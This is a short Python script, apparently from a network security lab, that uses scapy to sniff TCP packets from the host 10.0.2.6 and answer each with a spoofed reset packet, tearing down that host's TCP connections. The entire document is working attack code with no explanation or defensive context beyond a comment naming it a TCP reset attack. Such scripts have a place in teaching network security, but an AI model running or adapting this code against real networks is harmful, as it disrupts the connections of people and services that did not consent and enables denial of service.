#Python script to automatically perform a TCP reset attack

import sys
from scapy.all import * 

def spoof_tcp(pkt):
    IPLayer = IP(dst = "10.0.2.6", src = pkt[IP].dst)
    TCPLayer = TCP(flags = "R", seq = pkt[TCP].ack, 
                    dport = pkt[TCP].sport, sport = pkt[TCP].dport)
    spoofpkt = IPLayer/TCPLayer
    print("Sending reset packet......")
    send(spoofpkt, verbose=0)


pkt = sniff(filter = 'tcp and src host 10.0.2.6', prn=spoof_tcp)
